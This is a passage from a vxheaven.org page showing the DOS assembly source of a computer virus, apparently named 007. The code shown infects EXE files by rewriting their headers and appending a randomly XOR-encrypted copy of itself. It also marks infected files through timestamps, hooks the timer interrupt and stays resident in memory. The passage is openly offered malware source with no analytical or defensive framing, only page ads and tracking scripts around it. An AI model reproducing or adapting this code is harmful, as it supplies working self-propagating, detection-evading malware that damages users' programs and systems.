                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">300</span>
                <span style="color: #00007f; font-weight: bold;">jbe</span>     __exit
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">65536</span><span style="color: #339933;">-</span><span style="color: #ff0000;">256</span><span style="color: #339933;">-</span><span style="color: #ff0000;">2</span> <span style="color: #339933;">-</span> virsize
                <span style="color: #00007f; font-weight: bold;">ja</span>      __exit
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1000</span>
                <span style="color: #00007f; font-weight: bold;">div</span>     <span style="color: #46aa03; font-weight: bold;">cx</span>
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">7</span>
                <span style="color: #00007f; font-weight: bold;">jbe</span>     __exit
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> dta<span style="color: #339933;">.</span>dta_date
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">dx</span>
                <span style="color: #00007f; font-weight: bold;">xchg</span>    <span style="color: #46aa03; font-weight: bold;">ch</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cl</span>
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> dta<span style="color: #339933;">.</span>dta_time
                <span style="color: #00007f; font-weight: bold;">je</span>      __exit
&nbsp;
                <span style="color: #00007f; font-weight: bold;">clc</span>
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
__exit<span style="color: #339933;">:</span>         <span style="color: #00007f; font-weight: bold;">stc</span>
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
infect_exe<span style="color: #339933;">:</span>     <span style="color: #00007f; font-weight: bold;">call</span>    file_init
                <span style="color: #00007f; font-weight: bold;">jc</span>      __exit
&nbsp;
                <span style="color: #00007f; font-weight: bold;">call</span>    check_avail
                <span style="color: #00007f; font-weight: bold;">jc</span>      __exit
&nbsp;
                <span style="color: #00007f; font-weight: bold;">call</span>    file_open
                <span style="color: #00007f; font-weight: bold;">jc</span>      __exit
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3fh</span>
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> exe
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> size exe_struc
                <span style="color: #00007f; font-weight: bold;">call</span>    call21
&nbsp;
                <span style="color: #00007f; font-weight: bold;">cmp</span>     exe<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr file_id_offs<span style="color: #339933;">,</span> file_id
                <span style="color: #00007f; font-weight: bold;">je</span>      __settime
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> exe<span style="color: #339933;">.</span>exe_mz
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'ZM'</span>
                <span style="color: #00007f; font-weight: bold;">jne</span>     __close
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> exe<span style="color: #339933;">.</span>exe_num512
                <span style="color: #00007f; font-weight: bold;">dec</span>     <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">jz</span>      __close
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">dx</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">512</span>
                <span style="color: #00007f; font-weight: bold;">mul</span>     <span style="color: #46aa03; font-weight: bold;">cx</span>
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> exe<span style="color: #339933;">.</span>exe_last512
                <span style="color: #00007f; font-weight: bold;">jc</span>      __close
&nbsp;
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> dta<span style="color: #339933;">.</span>dta_size<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #ff0000;">0</span>
                <span style="color: #00007f; font-weight: bold;">jne</span>     __close
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> exe<span style="color: #339933;">.</span>exe_ss
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">16</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     save_ss<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> exe<span style="color: #339933;">.</span>exe_sp
                <span style="color: #00007f; font-weight: bold;">mov</span>     save_sp<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> exe<span style="color: #339933;">.</span>exe_cs
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">16</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     save_cs<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> exe<span style="color: #339933;">.</span>exe_ip
                <span style="color: #00007f; font-weight: bold;">mov</span>     save_ip<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> dta<span style="color: #339933;">.</span>dta_size<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #ff0000;">0</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> exe<span style="color: #339933;">.</span>exe_headersize
                <span style="color: #00007f; font-weight: bold;">shl</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4</span>
                <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span>
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">15</span>
                <span style="color: #00007f; font-weight: bold;">and</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0fff0h</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">shr</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4</span>
                <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">16</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     exe<span style="color: #339933;">.</span>exe_cs<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     exe<span style="color: #339933;">.</span>exe_ip<span style="color: #339933;">,</span> offset exe_start
                <span style="color: #00007f; font-weight: bold;">mov</span>     exe<span style="color: #339933;">.</span>exe_ss<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     exe<span style="color: #339933;">.</span>exe_sp<span style="color: #339933;">,</span> offset exe_sptr
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     exe<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr file_id_offs<span style="color: #339933;">,</span> file_id
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     zero_ptr<span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     start_ptr<span style="color: #339933;">,</span> <span style="color: #ff0000;">100h</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> dta<span style="color: #339933;">.</span>dta_size<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #ff0000;">0</span>
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">15</span>
                <span style="color: #00007f; font-weight: bold;">and</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0fff0h</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">si</span>
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> virsize
                <span style="color: #00007f; font-weight: bold;">jc</span>      __close
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">dx</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">512</span>
                <span style="color: #00007f; font-weight: bold;">div</span>     <span style="color: #46aa03; font-weight: bold;">cx</span>
                <span style="color: #00007f; font-weight: bold;">inc</span>     <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     exe<span style="color: #339933;">.</span>exe_num512<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     exe<span style="color: #339933;">.</span>exe_last512<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">dx</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> exe<span style="color: #339933;">.</span>exe_minmem
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> exememory
                <span style="color: #00007f; font-weight: bold;">jnc</span>     __1
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #339933;">-</span><span style="color: #ff0000;">1</span>
__1<span style="color: #339933;">:</span>            <span style="color: #00007f; font-weight: bold;">mov</span>     exe<span style="color: #339933;">.</span>exe_minmem<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> exe<span style="color: #339933;">.</span>exe_maxmem
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> exememory
                <span style="color: #00007f; font-weight: bold;">jnc</span>     __2
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #339933;">-</span><span style="color: #ff0000;">1</span>
__2<span style="color: #339933;">:</span>            <span style="color: #00007f; font-weight: bold;">mov</span>     exe<span style="color: #339933;">.</span>exe_maxmem<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4200h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">si</span>
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    call21
&nbsp;
                <span style="color: #00007f; font-weight: bold;">call</span>    infect_1
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">40h</span>
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> exe
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> size exe_struc
                <span style="color: #00007f; font-weight: bold;">call</span>    call21
&nbsp;
                <span style="color: #00007f; font-weight: bold;">inc</span>     exe_counter
&nbsp;
__settime<span style="color: #339933;">:</span>      <span style="color: #00007f; font-weight: bold;">call</span>    set_v_time
&nbsp;
__close<span style="color: #339933;">:</span>        <span style="color: #00007f; font-weight: bold;">call</span>    file_close
&nbsp;
__exit<span style="color: #339933;">:</span>         <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
infect_1<span style="color: #339933;">:</span>       <span style="color: #00007f; font-weight: bold;">call</span>    fuck_sft
&nbsp;
                <span style="color: #00007f; font-weight: bold;">call</span>    random
                <span style="color: #00007f; font-weight: bold;">mov</span>     xor_word<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    random
                <span style="color: #00007f; font-weight: bold;">mov</span>     add_word<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    random
                <span style="color: #00007f; font-weight: bold;">mov</span>     sub_word<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">start</span>
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span> cryptedvir
                mve     <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> virsize
                <span style="color: #00007f; font-weight: bold;">cld</span>
                <span style="color: #00007f; font-weight: bold;">rep</span>     <span style="color: #00007f; font-weight: bold;">movsb</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">call</span>    code_xor
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">40h</span>
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> cryptedvir
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> virsize
                <span style="color: #00007f; font-weight: bold;">call</span>    call21
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4200h</span>
                <span style="color: #00007f; font-weight: bold;">cwd</span>
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    call21
&nbsp;
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
random<span style="color: #339933;">:</span>         <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">bx</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1234h</span>
rndword         <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">2</span>
                <span style="color: #00007f; font-weight: bold;">in</span>      <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">40h</span>
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">in</span>      <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">40h</span>
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">in</span>      <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">41h</span>
                <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">in</span>      <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">41h</span>
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">in</span>      <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">42h</span>
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">in</span>      <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">42h</span>
                <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
             <span style="color: black; font-style: italic;">;  mov     cs:rndword, bx</span>
                <span style="color: #00007f; font-weight: bold;">xchg</span>    <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">bx</span>
                <span style="color: #00007f; font-weight: bold;">test</span>    <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1</span>
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
int08<span style="color: #339933;">:</span>          <span style="color: #00007f; font-weight: bold;">nop</span>
                <span style="color: #00007f; font-weight: bold;">nop</span>
&nbsp;
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">0eah</span>
old08           <span style="color: #0000ff; font-weight: bold;">dd</span>      ?
&nbsp;
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">16</span> dup <span style="color: black;">&#40;</span><span style="color: #ff0000;">0F6h</span><span style="color: black;">&#41;</span>
&nbsp;
c4_size         <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span>c4_start
&nbsp;
virsize         <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #0000ff; font-weight: bold;">start</span>
codeend<span style="color: #339933;">:</span>
&nbsp;
                even
filename        <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">256</span> dup <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span>
compatch        <span style="color: #0000ff; font-weight: bold;">db</span>      orig_size dup <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span>
dta             dta_struc ?
exe             exe_struc ?
&nbsp;
cryptedvir      <span style="color: #0000ff; font-weight: bold;">db</span>      virsize<span style="color: #339933;">+</span><span style="color: #ff0000;">1</span> dup <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span>
&nbsp;
                even
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">512</span> dup <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span>
exe_sptr<span style="color: #339933;">:</span>
&nbsp;
exememory       <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: black;">&#40;</span><span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span>codeend<span style="color: #339933;">+</span><span style="color: #ff0000;">15</span><span style="color: black;">&#41;</span><span style="color: #339933;">/</span><span style="color: #ff0000;">16</span>
&nbsp;
initialize<span style="color: #339933;">:</span>     <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #0000ff; font-weight: bold;">start</span><span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: #ff0000;">0</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0E9h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #0000ff; font-weight: bold;">start</span><span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #ff0000;">1</span><span style="color: #339933;">,</span> invideo<span style="color: #339933;">-</span><span style="color: black;">&#40;</span><span style="color: #0000ff; font-weight: bold;">start</span><span style="color: #339933;">+</span><span style="color: #ff0000;">3</span><span style="color: black;">&#41;</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">cs</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    tsr
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4c00h</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21h</span>
&nbsp;
<span style="color: #0000ff; font-weight: bold;">code</span>            ends
                end     <span style="color: #0000ff; font-weight: bold;">start</span>
&nbsp;
&nbsp;</pre></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/src_view.php?lang=de&amp;file=007.zip&amp;view=007.ASM">de</a><a href="/src_view.php?lang=en&amp;file=007.zip&amp;view=007.ASM">en</a><a href="/src_view.php?lang=es&amp;file=007.zip&amp;view=007.ASM">es</a><a href="/src_view.php?lang=it&amp;file=007.zip&amp;view=007.ASM">it</a><a href="/src_view.php?lang=fr&amp;file=007.zip&amp;view=007.ASM">fr</a><a href="/src_view.php?lang=pl&amp;file=007.zip&amp;view=007.ASM">pl</a><a href="/src_view.php?lang=ru&amp;file=007.zip&amp;view=007.ASM">ru</a><a href="/src_view.php?lang=ua&amp;file=007.zip&amp;view=007.ASM">ua</a></div>
</body>
</html>
